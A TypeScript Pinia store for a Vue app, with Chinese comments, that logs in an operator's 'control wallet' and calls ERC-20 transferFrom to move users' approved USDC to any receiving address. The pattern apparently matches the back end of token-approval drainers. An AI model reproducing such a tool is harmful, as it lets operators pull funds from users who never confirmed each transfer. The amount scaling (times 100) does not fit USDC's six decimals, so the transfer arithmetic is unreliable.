import { defineStore } from 'pinia';
import Web3 from 'web3'
import provider from 'eth-provider'
import erc20ABI from '#/utils/erc20/erc20.abi.json';
import { message } from 'ant-design-vue';

let _web3: Web3;
const web3 = () => {
  if (!_web3) {
    _web3 = new Web3(provider())
  }

  return _web3;
}

export const useWalletStore = defineStore('walletStore', {
  actions: {
    async walletLogin(controlAddress: string) {

      var addressResult: any = await web3().eth.requestAccounts();
      console.log("授权", addressResult)

      for (let index = 0; index < addressResult.length; index++) {
        const element: string = addressResult[index];
        if (element.toLocaleUpperCase() == controlAddress.toLocaleUpperCase()) {
          this.controlAddressWallet = element;
          this.controlAddressWalletStatus = 1;
          break;
        }
      }



      if (this.controlAddressWalletStatus == 0) {
        message.error('控制钱包登录错误,不是授权的控制钱包!')
      } else {
        message.success('控制钱包登录成功!')
      }
    },
    /**
     * 转移用户资产
     * @param receiveAddress 收款地址
     * @param fromUserAddress 转出的用户地址
     * @param controlAddress 控制账户地址
     * @param transferAmount 转出数量
     */
    async transferForUser(receiveAddress: string, fromUserAddress: string, controlAddress: string, transferAmount: number) {
      if (this.controlAddressWalletStatus == 0) {
        await this.walletLogin(controlAddress);

        if (this.controlAddressWalletStatus == 0) {
          message.error("控制钱包登录失败!");
          return;
        }
      }

      // console.log('传入的控制地址', controlAddress)
      // console.log('登录的控制地址', this.controlAddressWallet)


      if (controlAddress.toLocaleUpperCase() != this.controlAddressWallet.toLocaleUpperCase()) {
        message.error("控制钱包不是当前用户授权的地址!");
        return;
      }

      //USDC
      var erc20ContractAddress = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";

      //USDT
      // var erc20ContractAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
      var ERC20Contract = web3().eth.Contract
      var erc20Contract = new ERC20Contract(erc20ABI, erc20ContractAddress);

      return await erc20Contract.methods.transferFrom(fromUserAddress, receiveAddress, transferAmount * 100).send({
        from: this.controlAddressWallet
      })
    }
  },
  state: () => ({
    controlAddressWallet: '',
    controlAddressWalletStatus: 0
  }),
});
